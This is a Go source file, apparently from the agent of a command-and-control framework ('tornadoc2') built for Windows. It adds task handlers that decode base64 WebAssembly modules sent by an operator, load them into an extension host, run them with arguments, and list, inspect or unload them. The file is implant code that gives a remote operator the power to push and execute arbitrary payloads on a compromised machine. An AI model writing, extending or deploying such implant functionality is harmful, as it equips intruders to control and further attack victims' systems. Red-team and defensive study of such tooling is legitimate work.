//go:build windows && wasm_host

package core

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"sync"

	"tornadoc2/agent/extensions"
	"tornadoc2/agent/protocol"
)

var (
	extMu   sync.Mutex
	extHost *extensions.Host
	extErr  error
)

func extGet(ctx context.Context) (*extensions.Host, error) {
	extMu.Lock()
	defer extMu.Unlock()
	if extHost != nil || extErr != nil {
		return extHost, extErr
	}
	extHost, extErr = extensions.New(ctx)
	return extHost, extErr
}

func (a *Agent) extensionRegister(t protocol.Task) Result {
	if len(t.Args) < 2 {
		return Result{ID: t.ID,
			Error: "extension_register requires <name> <b64_wasm>"}
	}
	raw, err := base64.StdEncoding.DecodeString(t.Args[1])
	if err != nil {
		return Result{ID: t.ID, Error: "base64: " + err.Error()}
	}
	ctx := context.Background()
	h, err := extGet(ctx)
	if err != nil {
		return Result{ID: t.ID, Error: "host: " + err.Error()}
	}
	info, err := h.Load(ctx, t.Args[0], raw)
	if err != nil {
		return Result{ID: t.ID, Error: err.Error()}
	}
	return Result{ID: t.ID, Output: encodeOutput([]byte(
		"loaded " + info.Name + " sha256=" + info.SHA256 + "\n"))}
}

func (a *Agent) extensionCall(ctx context.Context, t protocol.Task) Result {
	if len(t.Args) < 1 {
		return Result{ID: t.ID, Error: "extension_call requires <name>"}
	}
	h, err := extGet(ctx)
	if err != nil {
		return Result{ID: t.ID, Error: "host: " + err.Error()}
	}
	out, rc, err := h.Call(ctx, t.Args[0], t.Args[1:],
		timeoutFor(t))
	if err != nil {
		return Result{ID: t.ID, Error: err.Error()}
	}
	return Result{ID: t.ID, Output: encodeOutput(out), ExitCode: rc}
}

func (a *Agent) extensionList(t protocol.Task) Result {
	h, err := extGet(context.Background())
	if err != nil {
		return Result{ID: t.ID, Error: "host: " + err.Error()}
	}
	out, _ := json.Marshal(h.List())
	return Result{ID: t.ID, Output: encodeOutput(out)}
}

func (a *Agent) extensionInfo(t protocol.Task) Result {
	if len(t.Args) < 1 {
		return Result{ID: t.ID, Error: "extension_info requires <name>"}
	}
	h, err := extGet(context.Background())
	if err != nil {
		return Result{ID: t.ID, Error: "host: " + err.Error()}
	}
	info, ok := h.Info(t.Args[0])
	if !ok {
		return Result{ID: t.ID, Error: "not loaded: " + t.Args[0]}
	}
	out, _ := json.Marshal(info)
	return Result{ID: t.ID, Output: encodeOutput(out)}
}

func (a *Agent) extensionUnload(t protocol.Task) Result {
	if len(t.Args) < 1 {
		return Result{ID: t.ID, Error: "extension_unload requires <name>"}
	}
	h, err := extGet(context.Background())
	if err != nil {
		return Result{ID: t.ID, Error: "host: " + err.Error()}
	}
	if err := h.Unload(context.Background(), t.Args[0]); err != nil {
		return Result{ID: t.ID, Error: err.Error()}
	}
	return Result{ID: t.ID,
		Output: encodeOutput([]byte("unloaded " + t.Args[0] + "\n"))}
}

func isExtensionVerb(verb string) bool {
	switch verb {
	case "extension_register", "extension_call",
		"extension_info", "extension_list", "extension_unload":
		return true
	}
	return false
}
